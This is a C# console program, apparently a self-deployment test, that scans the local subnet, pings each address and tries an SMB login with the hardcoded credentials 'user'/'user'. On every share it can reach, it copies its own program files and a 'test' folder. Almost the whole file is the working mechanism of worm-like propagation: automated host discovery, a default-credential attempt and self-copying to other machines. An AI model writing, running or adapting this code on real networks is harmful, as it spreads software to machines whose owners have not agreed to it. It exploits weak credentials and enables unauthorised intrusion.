using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace IpRangeScanner
{
    class Program
    {
        // --- P/Invoke definitions for WNetAddConnection2 & WNetCancelConnection2 ---
        [DllImport("mpr.dll", CharSet = CharSet.Auto)]
        public static extern int WNetAddConnection2(
            [In] NETRESOURCE lpNetResource,
            [In] string lpPassword,
            [In] string lpUsername,
            [In] int dwFlags);

        [DllImport("mpr.dll", CharSet = CharSet.Auto)]
        public static extern int WNetCancelConnection2(
            [In] string lpName,
            [In] int dwFlags,
            [In] bool fForce);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public class NETRESOURCE
        {
            public int dwScope;
            public int dwType;
            public int dwDisplayType;
            public int dwUsage;
            public string lpLocalName;
            public string lpRemoteName;
            public string lpComment;
            public string lpProvider;
        }

        // Constants for WNetAddConnection2
        public const int RESOURCETYPE_DISK = 0x1;
        public const int NO_ERROR = 0; // Equivalent to ERROR_SUCCESS

        // Error codes from WinError.h
        public const int ERROR_ACCESS_DENIED = 5;
        public const int ERROR_LOGON_FAILURE = 1326;
        public const int ERROR_INVALID_PASSWORD = 86;
        public const int ERROR_ALREADY_ASSIGNED = 85;

        // --- SMB Login Credentials ---
        const string SmbUsername = "user";
        const string SmbPassword = "user";
        const string SmbShareName = "SharedFolder"; // The name of the share you want to try to access (e.g., "VMShare")

        // --- Additional Folder to Copy Configuration ---
        const string AdditionalLocalFolderToInclude = "test";

        // --- Global List for SMB Connection Cleanup ---
        private static List<string> _activeSmbConnections = new List<string>();
        private static object _smbConnectionLock = new object();

        static async Task Main(string[] args)
        {
            Console.Title = "Local Network IP, SMB Scanner & Self-Deploy (Robust)";
            Console.WriteLine("Starting IP Range, SMB Scan, and Self-Deployment Test...");
            Console.WriteLine("-----------------------------------");

            // --- Register Global Cleanup Handlers ---
            AppDomain.CurrentDomain.ProcessExit += CurrentDomain_ProcessExit;
            Console.CancelKeyPress += Console_CancelKeyPress;

            // --- 1. Prepare the Deployment Package (using TemporaryDirectory helper) ---
            string finalSourceToCopy = null; // Will store the path to the prepared package
            using (var tempDeploymentPackage = new TemporaryDirectory("IpScannerDeployment")) // Creates and registers for cleanup
            {
                finalSourceToCopy = tempDeploymentPackage.Path; // Get the path for our operations

                string currentExeDirectory = AppDomain.CurrentDomain.BaseDirectory;

                Console.WriteLine($"Preparing deployment package in temporary folder: {finalSourceToCopy}");

                try
                {
                    // Copy this program's files into the temporary folder
                    Console.WriteLine("Copying scanner program files...");
                    foreach (string file in Directory.GetFiles(currentExeDirectory))
                    {
                        if (!file.EndsWith(".tmp", StringComparison.OrdinalIgnoreCase))
                        {
                            File.Copy(file, Path.Combine(finalSourceToCopy, Path.GetFileName(file)), true);
                        }
                    }

                    // Check for and copy the additional folder (e.g., "test")
                    string additionalFolderPath = Path.Combine(currentExeDirectory, AdditionalLocalFolderToInclude);
                    if (Directory.Exists(additionalFolderPath))
                    {
                        Console.WriteLine($"Copying additional folder '{AdditionalLocalFolderToInclude}'...");
                        CopyDirectoryRecursive(additionalFolderPath, Path.Combine(finalSourceToCopy, AdditionalLocalFolderToInclude));
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine($"WARNING: Additional folder '{AdditionalLocalFolderToInclude}' not found at '{additionalFolderPath}'. Skipping copy.");
                        Console.ResetColor();
                    }

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("Deployment package prepared successfully.");
                    Console.ResetColor();
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"ERROR: Failed to prepare deployment package: {ex.Message}");
                    Console.ResetColor();
                    Console.WriteLine("Press any key to exit.");
                    Console.ReadKey();
                    return; // Exit if package preparation fails
                }

                Console.WriteLine($"Ready to transfer package from: {finalSourceToCopy}");

                // --- Rest of the existing SMB scan and transfer logic ---
                string baseIpAddress = GetLocalIpAddress();
                if (string.IsNullOrEmpty(baseIpAddress))
                {
                    Console.WriteLine("Could not determine local IP address. Please enter a base IP (e.g., 192.168.1.0):");
                    baseIpAddress = Console.ReadLine();
                }

                string networkPrefix = GetNetworkPrefix(baseIpAddress);

                if (string.IsNullOrEmpty(networkPrefix))
                {
                    Console.WriteLine("Invalid base IP address. Exiting.");
                    Console.ReadKey();
                    return;
                }

                Console.WriteLine($"Scanning network: {networkPrefix}.1 - {networkPrefix}.254 for active hosts and SMB shares.");
                Console.WriteLine($"Attempting SMB login with Username: '{SmbUsername}', Password: '{SmbPassword}' on share '\\\\<IP>\\{SmbShareName}'");
                Console.WriteLine("This might take a moment...");

                int maxConcurrentOperations = 50;
                using (SemaphoreSlim semaphore = new SemaphoreSlim(maxConcurrentOperations))
                {
                    var tasks = new List<Task>();

                    for (int i = 1; i < 255; i++)
                    {
                        string ipToScan = $"{networkPrefix}.{i}";

                        await semaphore.WaitAsync();

                        tasks.Add(Task.Run(async () =>
                        {
                            try
                            {
                                if (await PingIpAddress(ipToScan))
                                {
                                    await TrySmbConnectionAndTransfer(ipToScan, finalSourceToCopy);
                                }
                            }
                            finally
                            {
                                semaphore.Release();
                            }
                        }));
                    }

                    await Task.WhenAll(tasks);
                }

                Console.WriteLine("\n-----------------------------------");
                Console.WriteLine("Scan complete.");

            } // TemporaryDirectory's Dispose() is called here, cleaning up the temp folder.

            // --- Unregister Handlers ---
            AppDomain.CurrentDomain.ProcessExit -= CurrentDomain_ProcessExit;
            Console.CancelKeyPress -= Console_CancelKeyPress;

            Console.WriteLine("Press any key to exit.");
            Console.ReadKey();
        }

        // --- Global Cleanup Handlers ---
        private static void CurrentDomain_ProcessExit(object sender, EventArgs e)
        {
            Console.WriteLine("Process is exiting. Performing final SMB connection cleanup...");
            CleanupSmbConnections();
        }

        private static void Console_CancelKeyPress(object sender, ConsoleCancelEventArgs e)
        {
            Console.WriteLine("\nCtrl+C detected. Performing SMB connection cleanup and exiting...");
            CleanupSmbConnections();
            e.Cancel = false; // Allow the process to terminate
        }

        private static void CleanupSmbConnections()
        {
            lock (_smbConnectionLock)
            {
                foreach (var remotePath in _activeSmbConnections)
                {
                    try
                    {
                        // WNetCancelConnection2 can block, so run asynchronously if possible,
                        // but during process exit, we just need to ensure it's done.
                        WNetCancelConnection2(remotePath, 0, false);
                        Console.WriteLine($"[CLEANUP] Disconnected from {remotePath}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[CLEANUP ERROR] Failed to disconnect from {remotePath}: {ex.Message}");
                    }
                }
                _activeSmbConnections.Clear();
            }
        }


        // --- Helper for Recursive Directory Copy ---
        static void CopyDirectoryRecursive(string sourcePath, string destinationPath)
        {
            // Ensure destination exists
            Directory.CreateDirectory(destinationPath);

            // Create all of the subdirectories
            foreach (string dirPath in Directory.GetDirectories(sourcePath, "*", SearchOption.AllDirectories))
            {
                Directory.CreateDirectory(dirPath.Replace(sourcePath, destinationPath));
            }

            // Copy all the files
            foreach (string newPath in Directory.GetFiles(sourcePath, "*.*", SearchOption.AllDirectories))
            {
                File.Copy(newPath, newPath.Replace(sourcePath, destinationPath), true);
            }
        }


        static string GetLocalIpAddress()
        {
            try
            {
                string hostName = Dns.GetHostName();
                IPHostEntry ipEntry = Dns.GetHostEntry(hostName);

                foreach (IPAddress ip in ipEntry.AddressList)
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork && !IPAddress.IsLoopback(ip))
                    {
                        Console.WriteLine($"Local IP Address detected: {ip.ToString()}");
                        return ip.ToString();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error getting local IP: {ex.Message}");
            }
            return null;
        }

        static string GetNetworkPrefix(string ipAddress)
        {
            if (string.IsNullOrEmpty(ipAddress)) return null;

            string[] octets = ipAddress.Split('.');
            if (octets.Length == 4)
            {
                return $"{octets[0]}.{octets[1]}.{octets[2]}";
            }
            return null;
        }

        static async Task<bool> PingIpAddress(string ipAddress)
        {
            using (Ping pinger = new Ping())
            {
                try
                {
                    PingReply reply = await pinger.SendPingAsync(ipAddress, 1000); // 1-second timeout

                    if (reply.Status == IPStatus.Success)
                    {
                        Console.WriteLine($"[ACTIVE] IP: {ipAddress} - Latency: {reply.RoundtripTime} ms");
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
                catch (PingException)
                {
                    return false;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[ERROR] IP: {ipAddress} - {ex.Message}");
                    return false;
                }
            }
        }

        static async Task TrySmbConnectionAndTransfer(string ipAddress, string sourceFolderToCopy)
        {
            string remoteSharePath = $"\\\\{ipAddress}\\{SmbShareName}";

            NETRESOURCE nr = new NETRESOURCE
            {
                dwType = RESOURCETYPE_DISK,
                lpRemoteName = remoteSharePath,
                lpLocalName = null
            };

            int connectionResult = -1;
            try
            {
                connectionResult = await Task.Run(() =>
                    WNetAddConnection2(nr, SmbPassword, SmbUsername, 0));
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[SMB ERROR] IP: {ipAddress} - Exception calling WNetAddConnection2: {ex.Message}");
                return;
            }

            if (connectionResult == NO_ERROR || connectionResult == ERROR_ALREADY_ASSIGNED)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[SMB SUCCESS] IP: {ipAddress} - Connected to share '{SmbShareName}'.");
                Console.ResetColor();

                // Register connection for global cleanup IF we established a new one
                if (connectionResult == NO_ERROR)
                {
                    lock (_smbConnectionLock)
                    {
                        _activeSmbConnections.Add(remoteSharePath);
                    }
                }

                try
                {
                    await CopyFolderToSmbShare(sourceFolderToCopy, remoteSharePath);
                }
                finally
                {
                    // Disconnect after operation (only if we established this specific connection)
                    if (connectionResult == NO_ERROR)
                    {
                        try
                        {
                            await Task.Run(() => WNetCancelConnection2(remoteSharePath, 0, false));
                            lock (_smbConnectionLock)
                            {
                                _activeSmbConnections.Remove(remoteSharePath); // Remove from our tracking list
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[SMB ERROR] IP: {ipAddress} - Error disconnecting from share: {ex.Message}");
                        }
                    }
                }
            }
            else
            {
                string errorMessage = GetSmbErrorMessage(connectionResult);
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine($"[SMB FAILED] IP: {ipAddress} - Share '{SmbShareName}' - Error Code: {connectionResult} ({errorMessage})");
                Console.ResetColor();
            }
        }

        static string GetSmbErrorMessage(int errorCode)
        {
            switch (errorCode)
            {
                case NO_ERROR: return "Success";
                case ERROR_ACCESS_DENIED: return "Access Denied (share permissions or user account issue)";
                case ERROR_LOGON_FAILURE: return "Logon Failure (incorrect username or password)";
                case ERROR_INVALID_PASSWORD: return "Invalid Password (for the given username)";
                case ERROR_ALREADY_ASSIGNED: return "Already Connected (A connection to this remote resource is already present).";
                case 67: return "Network Name Not Found (share not available or machine name/IP is wrong)";
                case 53: return "Network Path Not Found (machine not reachable or share doesn't exist)";
                case 1203: return "No network provider accepted the given network path";
                default: return $"Unknown Error Code: {errorCode}";
            }
        }

        static async Task CopyFolderToSmbShare(string sourceDir, string destinationSharePath)
        {
            try
            {
                DirectoryInfo sourceDirInfo = new DirectoryInfo(sourceDir);
                string destinationPath = Path.Combine(destinationSharePath, sourceDirInfo.Name);

                Console.WriteLine($"[TRANSFER] Copying folder '{sourceDirInfo.Name}' (deployment package) to '{destinationPath}'...");

                await Task.Run(() => CopyDirectoryRecursive(sourceDir, destinationPath));

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[TRANSFER SUCCESS] Folder '{sourceDirInfo.Name}' copied successfully to {destinationPath}");
                Console.ResetColor();
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[TRANSFER FAILED] Access denied during package transfer. Check permissions on '{destinationSharePath}'. Error: {ex.Message}");
                Console.ResetColor();
            }
            catch (DirectoryNotFoundException ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[TRANSFER FAILED] Source or destination directory not found during package transfer. Error: {ex.Message}");
                Console.ResetColor();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[TRANSFER FAILED] An error occurred during package folder copy: {ex.Message}");
                Console.ResetColor();
            }
        }

        /// <summary>
        /// Helper class to manage a temporary directory, ensuring it's cleaned up.
        /// </summary>
        class TemporaryDirectory : IDisposable
        {
            public string Path { get; private set; }
            private bool _disposed = false;

            public TemporaryDirectory(string prefix = "TempDir")
            {
                Path = System.IO.Path.Combine(System.IO.Path.GetTempPath(), $"{prefix}_{Guid.NewGuid().ToString().Substring(0, 8)}");
                Directory.CreateDirectory(Path);

                // Register for process exit cleanup
                AppDomain.CurrentDomain.ProcessExit += OnProcessExit;
            }

            public void Dispose()
            {
                Dispose(true);
                GC.SuppressFinalize(this); // Prevent the finalizer from running
            }

            protected virtual void Dispose(bool disposing)
            {
                if (!_disposed)
                {
                    if (disposing)
                    {
                        // Remove the process exit handler to avoid double cleanup
                        AppDomain.CurrentDomain.ProcessExit -= OnProcessExit;
                        // Clean up managed resources
                    }

                    // Clean up unmanaged resources (the temp directory)
                    CleanupTemporaryDirectory();
                    _disposed = true;
                }
            }

            ~TemporaryDirectory()
            {
                Dispose(false); // Called by GC if Dispose was not called explicitly
            }

            private void OnProcessExit(object sender, EventArgs e)
            {
                Console.WriteLine($"[CLEANUP] Process exit detected for temp folder: {Path}");
                CleanupTemporaryDirectory();
            }

            private void CleanupTemporaryDirectory()
            {
                if (Directory.Exists(Path))
                {
                    try
                    {
                        Console.WriteLine($"[CLEANUP] Deleting temporary directory: {Path}");
                        Directory.Delete(Path, true); // true for recursive delete
                    }
                    catch (Exception ex)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"[CLEANUP ERROR] Failed to delete temporary directory '{Path}': {ex.Message}");
                        Console.ResetColor();
                    }
                }
            }
        }
    }
}